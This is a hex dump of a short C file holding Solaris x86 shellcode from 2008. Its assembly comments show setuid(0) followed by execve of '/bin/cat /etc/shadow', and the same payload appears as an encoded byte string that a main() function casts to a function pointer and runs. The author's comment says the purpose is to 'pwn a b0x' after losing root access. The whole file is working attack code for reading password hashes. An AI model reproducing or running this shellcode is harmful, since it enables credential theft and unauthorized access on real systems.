00000000  2f 2a 0d 0a 3b 20 73 6d  34 78 20 32 30 30 38 0d  |/*..; sm4x 2008.|
00000010  0a 3b 20 2f 62 69 6e 2f  63 61 74 20 2f 65 74 63  |.; /bin/cat /etc|
00000020  2f 73 68 61 64 6f 77 0d  0a 3b 20 35 39 20 62 79  |/shadow..; 59 by|
00000030  74 65 73 0d 0a 3b 20 53  75 6e 4f 53 20 73 6f 6c  |tes..; SunOS sol|
00000040  30 31 20 35 2e 31 31 20  73 6e 76 5f 38 36 20 69  |01 5.11 snv_86 i|
00000050  38 36 70 63 20 69 33 38  36 20 69 38 36 70 63 20  |86pc i386 i86pc |
00000060  53 6f 6c 61 72 69 73 0d  0a 3b 20 28 70 6f 72 74  |Solaris..; (port|
00000070  20 74 6f 20 53 75 6e 4f  53 20 74 6f 20 70 77 6e  | to SunOS to pwn|
00000080  20 61 20 62 30 78 20 2d  20 74 68 61 6e 6b 20 67  | a b0x - thank g|
00000090  6f 64 20 66 6f 72 20 74  68 61 74 20 64 65 66 61  |od for that defa|
000000a0  75 6c 74 20 5f 5f 75 6e  69 78 5f 5f 20 43 52 59  |ult __unix__ CRY|
000000b0  50 54 5f 44 45 46 41 55  4c 54 21 21 21 21 29 0d  |PT_DEFAULT!!!!).|
000000c0  0a 3b 20 74 68 69 73 20  69 73 20 77 68 61 74 20  |.; this is what |
000000d0  68 61 70 70 65 6e 73 20  77 68 65 6e 20 75 72 20  |happens when ur |
000000e0  77 6f 72 6b 20 74 61 6b  65 73 20 61 77 61 79 20  |work takes away |
000000f0  72 6f 6f 74 20 70 69 72  76 20 6f 6e 20 61 20 53  |root pirv on a S|
00000100  75 6e 4f 53 20 62 6f 78  20 3a 2d 2f 0d 0a 0d 0a  |unOS box :-/....|
00000110  67 6c 6f 62 61 6c 20 5f  73 74 61 72 74 0d 0a 5f  |global _start.._|
00000120  73 74 61 72 74 3a 0d 0a  0d 0a 78 6f 72 20 20 20  |start:....xor   |
00000130  20 20 65 61 78 2c 20 65  61 78 0d 0a 0d 0a 3b 20  |  eax, eax....; |
00000140  2d 2d 2d 20 73 65 74 75  69 64 28 30 29 0d 0a 70  |--- setuid(0)..p|
00000150  75 73 68 20 20 20 20 65  61 78 0d 0a 70 75 73 68  |ush    eax..push|
00000160  20 20 20 20 65 61 78 0d  0a 6d 6f 76 20 20 20 20  |    eax..mov    |
00000170  20 61 6c 2c 20 30 78 31  37 0d 0a 69 6e 74 20 20  | al, 0x17..int  |
00000180  20 20 20 30 78 39 31 0d  0a 0d 0a 3b 20 2d 2d 2d  |   0x91....; ---|
00000190  20 73 65 74 75 70 20 2f  65 74 63 2f 73 68 61 64  | setup /etc/shad|
000001a0  6f 77 0d 0a 6a 6d 70 20  20 20 20 20 73 68 6f 72  |ow..jmp     shor|
000001b0  74 20 20 20 6c 6f 61 64  5f 66 69 6c 65 0d 0a 6f  |t   load_file..o|
000001c0  6b 3a 0d 0a 70 6f 70 20  20 20 20 20 65 73 69 0d  |k:..pop     esi.|
000001d0  0a 0d 0a 3b 20 73 65 74  75 70 20 2f 62 69 6e 2f  |...; setup /bin/|
000001e0  63 61 74 0d 0a 70 75 73  68 20 20 20 20 65 61 78  |cat..push    eax|
000001f0  0d 0a 70 75 73 68 20 20  20 20 30 78 37 34 36 31  |..push    0x7461|
00000200  36 33 32 66 0d 0a 70 75  73 68 20 20 20 20 30 78  |632f..push    0x|
00000210  36 65 36 39 36 32 32 66  0d 0a 6d 6f 76 20 20 20  |6e69622f..mov   |
00000220  20 20 65 62 78 2c 20 65  73 70 0d 0a 0d 0a 3b 20  |  ebx, esp....; |
00000230  2d 2d 2d 20 61 72 72 61  79 20 73 65 74 75 70 0d  |--- array setup.|
00000240  0a 70 75 73 68 20 20 20  20 65 61 78 20 20 20 20  |.push    eax    |
00000250  20 3b 20 6e 75 6c 6c 0d  0a 70 75 73 68 20 20 20  | ; null..push   |
00000260  20 65 73 69 20 20 20 20  20 3b 20 2f 65 74 63 2f  | esi     ; /etc/|
00000270  73 68 61 64 6f 77 0d 0a  70 75 73 68 20 20 20 20  |shadow..push    |
00000280  65 62 78 20 20 20 20 20  3b 20 2f 62 69 6e 2f 63  |ebx     ; /bin/c|
00000290  61 74 0d 0a 6d 6f 76 20  20 20 20 20 65 64 78 2c  |at..mov     edx,|
000002a0  20 65 73 70 0d 0a 0d 0a  3b 20 2d 2d 20 65 78 65  | esp....; -- exe|
000002b0  63 76 65 28 29 0d 0a 70  75 73 68 20 20 20 20 65  |cve()..push    e|
000002c0  61 78 20 20 20 20 20 3b  20 30 0d 0a 70 75 73 68  |ax     ; 0..push|
000002d0  20 20 20 20 65 64 78 20  20 20 20 20 3b 20 61 72  |    edx     ; ar|
000002e0  72 61 79 20 7b 20 22 2f  62 69 6e 2f 63 61 74 22  |ray { "/bin/cat"|
000002f0  2c 20 22 2f 65 74 63 2f  73 68 61 64 6f 77 22 2c  |, "/etc/shadow",|
00000300  20 30 7d 0d 0a 70 75 73  68 20 20 20 20 65 62 78  | 0}..push    ebx|
00000310  20 20 20 20 20 3b 20 2f  62 69 6e 2f 63 61 74 0d  |     ; /bin/cat.|
00000320  0a 6d 6f 76 20 20 20 20  20 61 6c 2c 20 30 78 33  |.mov     al, 0x3|
00000330  62 0d 0a 70 75 73 68 20  20 20 20 65 61 78 0d 0a  |b..push    eax..|
00000340  69 6e 74 20 20 20 20 20  30 78 39 31 0d 0a 0d 0a  |int     0x91....|
00000350  3b 20 2d 2d 2d 20 65 78  69 74 0d 0a 69 6e 63 09  |; --- exit..inc.|
00000360  65 61 78 0d 0a 70 75 73  68 20 20 20 20 65 61 78  |eax..push    eax|
00000370  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 69  |..push    eax..i|
00000380  6e 74 20 20 20 20 20 30  78 39 31 0d 0a 0d 0a 6c  |nt     0x91....l|
00000390  6f 61 64 5f 66 69 6c 65  3a 0d 0a 63 61 6c 6c 20  |oad_file:..call |
000003a0  20 20 20 6f 6b 0d 0a 64  62 20 20 20 20 20 20 27  |   ok..db      '|
000003b0  2f 65 74 63 2f 73 68 61  64 6f 77 27 0d 0a 0d 0a  |/etc/shadow'....|
000003c0  2a 2f 0d 0a 0d 0a 23 69  6e 63 6c 75 64 65 20 22  |*/....#include "|
000003d0  73 74 64 69 6f 2e 68 22  0d 0a 0d 0a 63 68 61 72  |stdio.h"....char|
000003e0  20 63 6f 64 65 5b 5d 20  3d 20 20 22 5c 78 33 31  | code[] =  "\x31|
000003f0  5c 78 63 30 5c 78 35 30  5c 78 35 30 5c 78 62 30  |\xc0\x50\x50\xb0|
00000400  5c 78 31 37 5c 78 63 64  5c 78 39 31 5c 78 65 62  |\x17\xcd\x91\xeb|
00000410  5c 78 32 30 22 0d 0a 09  09 22 5c 78 35 65 5c 78  |\x20"...."\x5e\x|
00000420  35 30 5c 78 36 38 5c 78  32 66 5c 78 36 33 5c 78  |50\x68\x2f\x63\x|
00000430  36 31 5c 78 37 34 5c 78  36 38 5c 78 32 66 5c 78  |61\x74\x68\x2f\x|
00000440  36 32 22 0d 0a 09 09 22  5c 78 36 39 5c 78 36 65  |62"...."\x69\x6e|
00000450  5c 78 38 39 5c 78 65 33  5c 78 35 30 5c 78 35 36  |\x89\xe3\x50\x56|
00000460  5c 78 35 33 5c 78 38 39  5c 78 65 32 5c 78 35 30  |\x53\x89\xe2\x50|
00000470  22 0d 0a 09 09 22 5c 78  35 32 5c 78 35 33 5c 78  |"...."\x52\x53\x|
00000480  62 30 5c 78 33 62 5c 78  35 30 5c 78 63 64 5c 78  |b0\x3b\x50\xcd\x|
00000490  39 31 5c 78 34 30 5c 78  35 30 5c 78 35 30 22 0d  |91\x40\x50\x50".|
000004a0  0a 09 09 22 5c 78 63 64  5c 78 39 31 5c 78 65 38  |..."\xcd\x91\xe8|
000004b0  5c 78 64 62 5c 78 66 66  5c 78 66 66 5c 78 66 66  |\xdb\xff\xff\xff|
000004c0  5c 78 32 66 5c 78 36 35  5c 78 37 34 22 0d 0a 09  |\x2f\x65\x74"...|
000004d0  09 22 5c 78 36 33 5c 78  32 66 5c 78 37 33 5c 78  |."\x63\x2f\x73\x|
000004e0  36 38 5c 78 36 31 5c 78  36 34 5c 78 36 66 5c 78  |68\x61\x64\x6f\x|
000004f0  37 37 22 3b 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |77";....int main|
00000500  28 69 6e 74 20 61 72 67  63 2c 20 63 68 61 72 20  |(int argc, char |
00000510  2a 2a 61 72 67 76 29 20  7b 0d 0a 20 69 6e 74 20  |**argv) {.. int |
00000520  28 2a 66 75 6e 63 29 28  29 3b 0d 0a 20 70 72 69  |(*func)();.. pri|
00000530  6e 74 66 28 22 42 79 74  65 73 3a 20 25 64 5c 6e  |ntf("Bytes: %d\n|
00000540  22 2c 20 73 69 7a 65 6f  66 28 63 6f 64 65 29 29  |", sizeof(code))|
00000550  3b 0d 0a 20 66 75 6e 63  20 3d 20 28 69 6e 74 20  |;.. func = (int |
00000560  28 2a 29 28 29 29 20 63  6f 64 65 3b 0d 0a 20 28  |(*)()) code;.. (|
00000570  69 6e 74 29 28 2a 66 75  6e 63 29 28 29 3b 0d 0a  |int)(*func)();..|
00000580  7d                                                |}|
00000581
